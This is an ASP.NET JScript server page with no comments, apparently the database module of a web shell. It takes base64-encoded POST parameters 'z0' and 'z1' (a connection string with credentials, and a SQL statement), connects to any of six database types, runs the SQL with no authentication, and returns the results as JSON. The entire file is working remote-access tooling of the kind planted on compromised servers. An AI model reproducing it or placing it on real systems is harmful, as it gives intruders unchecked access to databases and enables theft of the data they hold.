<%

function base64Decode(str) {
    if (!str || System.String(str).Trim() == "") return "";
    try {
        var bytes = System.Convert.FromBase64String(str);
        return System.Text.Encoding.UTF8.GetString(bytes);
    } catch(e) { return ""; }
}

function parseDSN(url) {
    var result = new System.Collections.Hashtable();
    if (url.indexOf("://") == -1) {
        throw new System.Exception("Invalid DSN format");
    }

    var p = url.split("://"); 
    var driver = p[0].toLowerCase();
    result.Add("driver", driver);

    var rest = p[1];

    if (driver != "sqlite" && driver != "access") {
        var atPos = rest.lastIndexOf("@");
        var userpass = rest.substring(0, atPos);
        var hostpart = rest.substring(atPos + 1);

        var up = userpass.split(":");
        if (up.length >= 1) result.Add("user", up[0]);
        if (up.length >= 2) result.Add("password", up[1]);

        var hp = hostpart.split("/");
        var hostport = hp[0].split(":");

        result.Add("host", hostport[0]);
        if (hostport.length >= 2) result.Add("port", hostport[1]);
        else result.Add("port", "");

        if (hp.length >= 2) result.Add("database", hp[1]);
        else result.Add("database", "");
    } else {
        result.Add("database", rest);
    }

    return result;
}

function jsonEscape(str) {
    if (!str) return "";
    var s = String(str);
    return s.replace(/\\/g, "\\\\").replace(/\"/g, "\\\"").replace(/\r\n/g, "\\n").replace(/\r/g, "\\n").replace(/\n/g, "\\n");
}

function executeQueryOleDb(connStr, sql) {
    var conn = new System.Data.OleDb.OleDbConnection(connStr);
    conn.Open();
    
    var cmd = new System.Data.OleDb.OleDbCommand(sql, conn);
    var reader = cmd.ExecuteReader();
    
    var output = "{\"success\":true,\"rowCount\":-1,\"data\":[";
    var hasRows = false;
    
    while (reader.Read()) {
        hasRows = true;
        output += "{";
        for (var i = 0; i < reader.FieldCount; i++) {
            output += "\"" + reader.GetName(i) + "\":\"" + jsonEscape(reader.GetValue(i).ToString()) + "\"";
            if (i < reader.FieldCount - 1) output += ",";
        }
        output += "},";
    }
    
    if (hasRows) output = output.substring(0, output.length - 1);
    output += "]}";
    
    reader.Close();
    conn.Close();
    return output;
}

function executeQueryOdbc(connStr, sql) {
    var conn = new System.Data.Odbc.OdbcConnection(connStr);
    conn.Open();
    
    var cmd = new System.Data.Odbc.OdbcCommand(sql, conn);
    var reader = cmd.ExecuteReader();
    
    var output = "{\"success\":true,\"rowCount\":-1,\"data\":[";
    var hasRows = false;
    
    while (reader.Read()) {
        hasRows = true;
        output += "{";
        for (var i = 0; i < reader.FieldCount; i++) {
            output += "\"" + reader.GetName(i) + "\":\"" + jsonEscape(reader.GetValue(i).ToString()) + "\"";
            if (i < reader.FieldCount - 1) output += ",";
        }
        output += "},";
    }
    
    if (hasRows) output = output.substring(0, output.length - 1);
    output += "]}";
    
    reader.Close();
    conn.Close();
    return output;
}

Response.Buffer = true;
Response.ContentType = "application/json";

var z0 = Request.Form["z0"] ? Request.Form["z0"] + "" : "";
var z1 = Request.Form["z1"] ? Request.Form["z1"] + "" : "";

var dsn_url = base64Decode(z0);
var sql = base64Decode(z1);

try {
    var cfg = parseDSN(dsn_url);
    var driver = String(cfg["driver"]);
    var connStr = "";
    var isOdbc = false;

    switch (driver) {
        case "mysql":
            var mysqlDrivers = [
                "{MySQL ODBC 8.0 Unicode Driver}",
                "{MySQL ODBC 8.0 Driver}",
                "{MySQL ODBC 5.3 Unicode Driver}",
                "{MySQL ODBC 3.51 Driver}",
                "{MySQL ODBC Driver}"
            ];
            
            var successConn = false;
            for (var m = 0; m < mysqlDrivers.length; m++) {
                var testStr = "Driver=" + mysqlDrivers[m] + ";Server=" + cfg["host"] + ";Port=" + (cfg["port"] ? cfg["port"] : "3306") + ";Database=" + cfg["database"] + ";Uid=" + cfg["user"] + ";Pwd=" + cfg["password"] + ";";
                try {
                    var testConn = new System.Data.Odbc.OdbcConnection(testStr);
                    testConn.Open();
                    testConn.Close();
                    connStr = testStr;
                    successConn = true;
                    break;
                } catch(ex) {}
            }
            
            if (!successConn) {
                connStr = "DSN=" + cfg["database"] + ";UID=" + cfg["user"] + ";PWD=" + cfg["password"] + ";";
            }
            isOdbc = true;
            break;
        case "pgsql":
            connStr = "Driver={PostgreSQL ODBC Driver(ANSI)};Server=" + cfg["host"] + ";Port=" + (cfg["port"] ? cfg["port"] : "5432") + ";Database=" + cfg["database"] + ";Uid=" + cfg["user"] + ";Pwd=" + cfg["password"] + ";";
            isOdbc = true;
            break;
        case "sqlsrv":
            connStr = "Provider=SQLOLEDB;Data Source=" + cfg["host"] + (cfg["port"] ? "," + cfg["port"] : "") + ";Initial Catalog=" + cfg["database"] + ";User ID=" + cfg["user"] + ";Password=" + cfg["password"] + ";";
            break;
        case "sqlite":
            connStr = "Driver={SQLite3 ODBC Driver};Database=" + cfg["database"] + ";";
            isOdbc = true;
            break;
        case "access":
            connStr = "Provider=Microsoft.ACE.OLEDB.12.0;Data Source=" + cfg["database"] + ";";
            break;
        case "oracle":
            connStr = "Provider=OraOLEDB.Oracle;Data Source=" + cfg["host"] + ":" + cfg["port"] + "/" + cfg["database"] + ";User Id=" + cfg["user"] + ";Password=" + cfg["password"] + ";";
            break;
        default:
            Response.Write("{\"success\":false,\"error\":\"Unsupported database type\"}");
            throw new System.Exception("STOP");
    }

    if (sql == "") {
        if (isOdbc) {
            var tConnOdbc = new System.Data.Odbc.OdbcConnection(connStr);
            tConnOdbc.Open(); tConnOdbc.Close();
        } else {
            var tConnOle = new System.Data.OleDb.OleDbConnection(connStr);
            tConnOle.Open(); tConnOle.Close();
        }
        Response.Write("{\"success\":true,\"message\":\"Database connection is OK\"}");
    } else {
        var jsonResult = isOdbc ? executeQueryOdbc(connStr, sql) : executeQueryOleDb(connStr, sql);
        Response.Write(jsonResult);
    }

} catch(e) {
    if (e.message != "STOP") {
        Response.Write("{\"success\":false,\"error\":\"" + jsonEscape(e.message) + "\"}");
    }
}

%>